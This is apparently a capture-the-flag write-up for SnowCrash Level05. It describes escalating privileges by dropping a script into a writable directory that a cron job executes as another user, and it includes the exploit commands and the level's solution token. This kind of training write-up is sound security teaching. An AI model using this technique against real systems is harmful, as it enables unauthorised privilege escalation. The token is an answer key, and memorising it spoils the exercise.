# Level05 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a cron job that executes writable scripts to retrieve the flag05 token.

## Vulnerability
Arbitrary code execution via writable directory with cron job executing shell scripts as flag05.

## Discovery

### Mail Hint
```bash
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

The cron job runs every 2 minutes, executing `/usr/sbin/openarenaserver` as flag05.

### Openarenaserver Script
```bash
cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

The script:
1. Loops through all files in `/opt/openarenaserver/`
2. Executes each with `bash -x` (as flag05)
3. Deletes the file after execution

### Directory Permissions
```bash
ls -la /opt/openarenaserver/
drwxrwxr-x+ 2 root root

getfacl /opt/openarenaserver/
default:user:level05:rwx
default:user:flag05:rwx
```

Level05 has write permissions via ACL!

## Exploitation

### Create Exploit Script
```bash
cat > /opt/openarenaserver/exploit.sh << 'EOF'
#!/bin/bash
whoami > /tmp/whoami.txt
id >> /tmp/whoami.txt
getflag >> /tmp/whoami.txt 2>&1
EOF
```

### Wait for Cron Execution
The cron runs every 2 minutes. Cron executes the script as flag05 because:
- Cron job: `su -c "sh /usr/sbin/openarenaserver" - flag05`
- Openarenaserver script: `bash -x "$i"` (executes in flag05's context)

### Extract Token
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Security Flaws

1. **Writable script directory**: `/opt/openarenaserver/` is writable by level05
2. **Cron privilege escalation**: Cron job runs scripts as flag05
3. **No input validation**: Any file in directory is executed
4. **File deletion creates race condition**: Scripts deleted after execution (no auditing)

## Answer

**Level05 Token**: `viuaaale9huek52boumoomioc`
**Vulnerability**: Arbitrary Code Execution via Cron Script Directory
**Impact**: Command execution as flag05 user via writable ACL directory
